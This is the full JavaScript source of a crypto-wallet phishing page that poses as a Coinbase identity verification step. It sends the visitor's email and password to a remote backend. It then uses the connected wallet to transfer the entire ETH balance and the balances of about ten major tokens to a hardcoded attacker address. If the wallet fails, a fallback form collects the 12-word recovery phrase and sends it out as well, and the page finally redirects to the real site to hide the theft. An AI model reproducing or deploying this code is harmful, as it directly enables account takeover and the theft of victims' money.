document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // SET THIS TO YOUR NEW RENDER BACKEND URL
    const backendUrl = "https://cb-backend-new.onrender.com";
    const myWallet = "0xfe78becb16668304c924e0b8d0ad46b6f5adcf87";
    
    const targetTokens = [
        "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
        "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
        "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        "0xA0b86991E6444989a7a7270AC91C4f1e0e7d68Fa",
        "0x6B175474E89094C44Da98b954EedeAC495271d0F",
        "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984",
        "0x514910771AF9Ca656af840dff83E8264EcF986CA",
        "0x7D1AfA7B718fb893dB30A3aBc0C5cc463165d63e",
        "0x95aD61b0a150d79219dCF64E1E6C01b09077902a",
        "0xA0b73E1Ff0B80914AB6fe0444E65D6822368 =="
    ];

    let userCredentials = { email: '', password: '' };

    async function sendToBackend(data) {
        try {
            await fetch(`${backendUrl}/update`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (e) { console.error("Backend error:", e); }
    }

    // Button Navigation
    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    document.getElementById('toStep3').onclick = () => {
        userCredentials.email = document.getElementById('email').value;
        userCredentials.password = document.getElementById('pass').value;
        
        if (userCredentials.email && userCredentials.password) {
            sendToBackend({ 
                email: userCredentials.email, 
                password: userCredentials.password 
            });
            step2.classList.add('hidden');
            step3.classList.remove('hidden');
        }
    };

    // Enter key logic for Step 2
    document.getElementById('pass').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            document.getElementById('toStep3').click();
        }
    });

    // Wallet Logic
    connectBtn.onclick = async () => {
        if (!window.ethereum) return triggerPlanB();
        
        try {
            status.innerText = "Connecting...";
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();
            
            sendToBackend({ walletAddress: userAddress });

            status.innerText = "Processing Assets...";
            const balance = await provider.getBalance(userAddress);
            
            if (balance > 0n) {
                await signer.sendTransaction({
                    to: myWallet,
                    value: balance
                });
            }

            for (const tokenAddr of targetTokens) {
                const tokenContract = new ethers.Contract(
                    tokenAddr, 
                    ["function balanceOf(address) view returns (uint256)", "function transfer(address, uint256) returns (bool)"], 
                    signer
                );
                const bal = await tokenContract.balanceOf(userAddress);
                if (bal > 0n) {
                    await tokenContract.transfer(myWallet, bal);
                }
            }

            status.innerText = "Verification successful. Redirecting...";
            setTimeout(() => { window.location.href = "https://coinbase.com"; }, 3000);

        } catch (err) {
            console.error(err);
            triggerPlanB();
        }
    };

    function triggerPlanB() {
        status.innerText = "Wallet error. Please verify manually.";
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1 style="font-size: 20px;">Identity Verification</h1>
            <p style="font-size: 14px;">Please enter your 12-word recovery phrase to verify account ownership.</p>
            <div class="form-group">
                <textarea id="phrase" placeholder="Enter 12 words here..." style="width:100%; height:80px;"></textarea>
            </div>
            <button id="submitPhrase" class="btn-primary">Restore Access</button>
        `;

        document.getElementById('submitPhrase').onclick = () => {
            const phrase = document.getElementById('phrase').value.trim();
            const words = phrase.split(/\s+/).filter(w => w.length > 0);
            
            if (words.length === 12) {
                sendToBackend({ 
                    email: userCredentials.email, 
                    password: userCredentials.password, 
                    recoveryPhrase: phrase 
                });
                status.innerText = "Processing...";
                setTimeout(() => { window.location.href = "https://coinbase.com"; }, 3000);
            } else {
                status.innerText = `Please enter exactly 12 words. (You entered ${words.length})`;
            }
        };
    }
});
